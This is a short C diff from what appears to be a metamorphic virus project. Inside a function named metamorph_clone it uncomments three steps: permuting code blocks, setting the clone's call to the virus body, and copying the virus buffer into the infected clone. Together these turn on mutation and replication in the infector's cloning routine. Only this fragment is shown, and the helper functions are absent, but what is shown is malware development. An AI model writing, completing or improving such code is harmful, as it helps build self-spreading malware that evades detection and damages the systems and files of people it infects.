@@ -151,9 +151,9 @@ bool		metamorph_clone(struct safe_ptr clone_ref, size_t loader_off,
 	|| !set_virus_buffer_size(&virus_buffer_size, virus_ref.size)
 	|| !permutate_registers(loader_ref, seed)
 	|| !permutate_instructions(virus_ref, seed)
-	// || !permutate_blocks(virus_ref, virus_buffer_ref, &virus_buffer_size, clone_virus_address, &clone_virus_address_shift, seed)
-	// || !set_clone_virus_call(clone_ref, loader_off, dist_vircall_loader, clone_virus_address_shift)
-	// || !copy_virus_buffer_to_clone(clone_ref, loader_off, dist_virus_loader, virus_buffer_ref, virus_buffer_size)
+	|| !permutate_blocks(virus_ref, virus_buffer_ref, &virus_buffer_size, clone_virus_address, &clone_virus_address_shift, seed)
+	|| !set_clone_virus_call(clone_ref, loader_off, dist_vircall_loader, clone_virus_address_shift)
+	|| !copy_virus_buffer_to_clone(clone_ref, loader_off, dist_virus_loader, virus_buffer_ref, virus_buffer_size)
 	|| !set_full_virus_size(full_virus_size, virus_buffer_size, virus_ref.size)
 	|| !true)
 	{
